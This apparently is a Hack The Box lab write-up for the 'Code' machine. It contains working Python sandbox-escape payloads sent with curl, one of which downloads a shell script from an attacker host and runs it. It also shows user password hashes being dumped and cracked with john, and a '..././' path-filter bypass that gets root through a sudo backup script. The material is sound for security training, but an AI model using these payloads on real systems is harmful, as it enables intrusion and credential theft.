---
layout: post
title: "HTB Writeup – Code"
date: 2025-06-23
image: /assets/machine/code/code.jpg
categories: ["HTB-Machine"]
tags: [htb, linux]
excerpt: "Exploit SSTI or PyJail."
---

<center>
<img src="/assets/machine/code/code.jpg" className="img-post" />
</center>

# Recon

## Port Scan

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
```

We can see there is a web service running on port 5000.

# User

## app-production

<center>
<img src="/assets/machine/code/web_code.jpg" className="img-post" />
</center>

On that web we can run arbitrary Python code, but functions commonly used for RCE are likely blacklisted, so we must bypass it.

> [Jinja2 SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)

Plus signs are added to bypass the blacklist.

```python
print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("ls /").re'+'ad()'))
```

Besides directly through the web, we can use curl to send code.

First we check the website using curl.

```bash
curl http://10.10.11.62:5000
```

We get the **/run_code** endpoint:

```php
$.post('/run_code', {code: code}, function(data) {
    document.getElementById('output').textContent = data.output;
});
```

Send it using curl and use --data-urlencode so curl encodes automatically.

```bash
curl -X POST http://10.10.11.62:5000/run_code \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode $'code=obj = globals()["__buil" + "tins__"][\'ev\' + \'al\']\nresult = obj(\'__imp\' + \'ort__("o\' + \'s").pop\' + \'en("ls").rea\' + \'d()\')\nprint(result)'
```

Now we perform RCE on the target.

```bash
curl -X POST http://10.10.11.62:5000/run_code \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode $'code=print(\'\'.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\'__buil\' + \'tins__\'][\'ev\' + \'al\'](\'__imp\' + \'ort__("o\' + \'s").po\' + \'pen("wget 10.10.xx.xx:1412/shell.sh -O /tmp/shell.sh").re\' + \'ad()\'))\nprint(\'\'.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\'__buil\' + \'tins__\'][\'ev\' + \'al\'](\'__imp\' + \'ort__("o\' + \'s").po\' + \'pen("bash /tmp/shell.sh").re\' + \'ad()\'))
```

<center>
<img src="/assets/machine/code/shell.png" className="img-post" />
</center>

The user flag is in this user’s home directory.

## Martin

There is `app/instance/database.db` using sqlite3.

```sql
SQLite version 3.49.1 2025-02-18 13:38:58                                        Enter ".help" for usage hints.
sqlite> .tables
code  user
sqlite> select * from user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

Crack using john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-MD5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
nafeelxxxxxxxxxxx (?)
```

Log in using SSH with the credentials above.

# Root

Run **sudo -l**

```bash
martin@code:~$ sudo -l
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Check the file **/usr/bin/backy.sh**

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

From the code above we know that:

1. It checks the input JSON file (task.json)
2. It sanitizes directories (../ is removed)
3. It ensures all directories to be archived are inside */var/* or */home/*
4. If all that succeeds, backy will perform backup.

We bypass **../** by making it double.

```json
{
  "directories_to_archive": [
    "/home/..././root/" 
  ],
  "destination": "/tmp"
}
```

Then run.

**sudo /usr/bin/backy.sh task.json**

Then extract the backup we made in the `/tmp` folder

<center>
<img src="/assets/machine/code/root.jpg" className="img-post" />
</center>

Of course we can also get **id_rsa**.

Rooted.
